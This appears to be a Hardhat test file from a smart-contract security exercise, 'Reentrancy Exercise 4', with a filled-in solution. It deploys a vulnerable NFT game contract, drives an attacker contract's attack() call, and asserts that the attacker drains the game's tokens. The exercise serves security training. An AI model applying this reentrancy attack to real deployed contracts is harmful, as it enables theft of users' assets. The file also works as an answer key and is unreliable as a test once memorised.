import { AttackCryptoEmpireGame } from './../../typechain-types/contracts/reentrancy-4/AttackCryptoEmpireGame';
import { ethers } from 'hardhat';
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { BigNumber } from 'ethers';
import { parseEther } from 'ethers/lib/utils';
import { expect } from 'chai';
import {
	CryptoEmpireGame,
	CryptoEmpireGame__factory,
	CryptoEmpireToken,
	CryptoEmpireToken__factory,
} from '../../typechain-types';

describe('Reentrancy Exercise 4', function () {
	let deployer: SignerWithAddress, user1: SignerWithAddress, user2: SignerWithAddress, attacker: SignerWithAddress;

	let cryptoEmpireToken: CryptoEmpireToken;
	let cryptoEmpireGame: CryptoEmpireGame;
	let attackerContract: AttackCryptoEmpireGame;

	before(async () => {
		[deployer, user1, user2, attacker] = await ethers.getSigners();

		const CryptoEmpireTokenFactory = (await ethers.getContractFactory(
			'contracts/reentrancy-4/CryptoEmpireToken.sol:CryptoEmpireToken',
			deployer
		)) as CryptoEmpireToken__factory;
		cryptoEmpireToken = await CryptoEmpireTokenFactory.deploy();

		const CryptoEmpireGameFactory = (await ethers.getContractFactory(
			'contracts/reentrancy-4/CryptoEmpireGame.sol:CryptoEmpireGame',
			deployer
		)) as CryptoEmpireGame__factory;
		cryptoEmpireGame = await CryptoEmpireGameFactory.deploy(cryptoEmpireToken.address);

		// Giving 1 NFT to each user
		cryptoEmpireToken.mint(user1.address, 1, 0);
		cryptoEmpireToken.mint(user2.address, 1, 1);
		cryptoEmpireToken.mint(attacker.address, 1, 2);

		// The CryptoEmpire game gained many users already and has some NFTs either staked or listed in it
		for (let i = 0; i <= 5; i++) {
			cryptoEmpireToken.mint(cryptoEmpireGame.address, 20, i);
		}
	});

	it('Exploit', async () => {
		/** CODE YOUR SOLUTION HERE */
		const attackerContractFactory = await ethers.getContractFactory('AttackCryptoEmpireGame', attacker);
		attackerContract = await attackerContractFactory.deploy(cryptoEmpireToken.address, cryptoEmpireGame.address);

		await cryptoEmpireToken.connect(attacker).setApprovalForAll(attackerContract.address, true);

		await cryptoEmpireToken.connect(attacker).safeTransferFrom(attacker.address, attackerContract.address, 2, 1, []);

		await attackerContract.attack();
	});

	after(async () => {
		// Attacker stole all the tokens from the game contract
		expect(await cryptoEmpireToken.balanceOf(attacker.address, 2)).to.be.at.least(20);
		expect(await cryptoEmpireToken.balanceOf(cryptoEmpireGame.address, 2)).to.be.equal(0);
	});
});
